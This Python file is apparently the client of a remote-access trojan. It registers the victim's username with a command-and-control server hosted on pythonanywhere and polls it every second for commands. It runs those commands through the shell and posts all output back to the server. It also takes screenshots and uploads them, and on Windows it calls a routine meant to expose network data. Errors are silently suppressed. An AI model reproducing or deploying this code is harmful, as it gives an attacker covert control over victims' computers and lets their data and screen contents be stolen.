from netpwner import NetworkPwner
import subprocess
import pyautogui
import requests
import time
import os
import sys
import re

class Exploit:
    def __init__(self):
        self.url = "https://meterpreter.pythonanywhere.com/"
        self.pattern = r"\s+",
        self.target = re.sub(r"\s+", "", subprocess.run('whoami',shell=True,capture_output=True,text=True).stdout)
        self.register()
    def exploit(self):
        commands = requests.get(f'{self.url}/register/commands?target={self.target}').json()
        for cm in commands:
            command = cm["command"]
            if command.startswith("cd"):
                try:
                    path = command[3:].strip()
                    os.chdir(path)
                    exc = os.getcwd()
                except Exception as e:
                    exc=f"process faild, error : {e}"
            elif command == "pwn networks" :
                if sys.platform in ["win32", "win64"]:
                    NetworkPwner.expose_data()
                else:
                    exc = f"Sorry , Unsupported platform : {sys.platform}"
            elif command in  ["screenshot","scsh","screen shot"]:
                self.screenshot()
                exc = None
            else: 
                exc = subprocess.run(command, shell=True,capture_output=True,text=True).stdout
            
            requests.delete(f'{self.url}/register/commands?command={command}')
            if exc:
                requests.post(f'{self.url}/register/log',json={
                    'target': self.target,
                    'log': exc,
                    'command': command,
                })
            
    
    def register(self):
        requests.post(f'{self.url}/register/states',json={"target":self.target,"state":"Connected"})
        requests.post(f'{self.url}/register/victime', json={
            "name" : self.target,
        })
    
    def screenshot(self):
        screenshot = pyautogui.screenshot()
        screenshot.save(".upls/screenshot.png")
        url = f"{self.url}/register/uploads"
        files = {"file": open(".upls/screenshot.png", "rb")}
        response = requests.post(url,json={"target":self.target},files=files)
        os.remove(".upls/screenshot.png")
        if response.status_code == 200:
            return "Screenshot uploaded successfully!"
        else:
            return "Upload failed:", response.status_code, response.text
        
    def clean_up(self):
        requests.delete(f'{self.url}/register/victime?name={self.target}')
        requests.post(f'{self.url}/register/states',json={"target":self.target,"state":"Disconnected"})
    def main(self):
        try:
            while True:
                self.exploit()
                time.sleep(1)
        except KeyboardInterrupt:
            self.clean_up()

       
try:
    Exploit().main()
except:
    pass
